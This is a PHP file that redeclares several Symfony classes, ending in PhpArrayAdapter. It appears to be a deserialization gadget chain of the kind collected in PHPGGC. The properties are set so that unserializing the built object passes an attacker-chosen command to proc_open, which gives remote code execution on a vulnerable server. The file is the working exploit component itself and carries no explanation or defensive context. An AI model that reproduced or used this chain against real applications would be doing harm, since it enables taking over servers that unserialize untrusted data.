<?php
namespace Symfony\Component\Routing\Loader\Configurator
{
    class ImportConfigurator
    {
        private $parent;

        function __construct($cmd)
        {
            $this->parent = new \Symfony\Component\Cache\Traits\RedisProxy($cmd);
        }
    }
}

namespace Symfony\Component\Cache\Traits
{
    class RedisProxy
    {
        private $initializer;
        private $redis;

        function __construct($cmd)
        {
            $this->initializer = new \Symfony\Component\DependencyInjection\Loader\Configurator\InstanceofConfigurator($cmd);
            $this->redis = $cmd;
        }
    }
}

namespace Symfony\Component\DependencyInjection\Loader\Configurator
{
    class InstanceofConfigurator
    {
        protected $parent;

        function __construct($cmd)
        {
            $this->parent = new \Symfony\Component\Cache\Simple\Psr6Cache($cmd);
        }

    }  
}

namespace Symfony\Component\Cache\Simple
{
    class Psr6Cache
    {
        private $pool;

        function __construct($cmd)
        {
            $this->pool = new \Symfony\Component\Cache\Adapter\PhpArrayAdapter($cmd);
        }

    }
}

namespace Symfony\Component\Cache\Adapter
{
    class PhpArrayAdapter
    {
        private $values;
        private $createCacheItem;

        function __construct($cmd)
        {
            $this->values = array($cmd=>[]);
            $this->createCacheItem = "proc_open";
        }
    }
}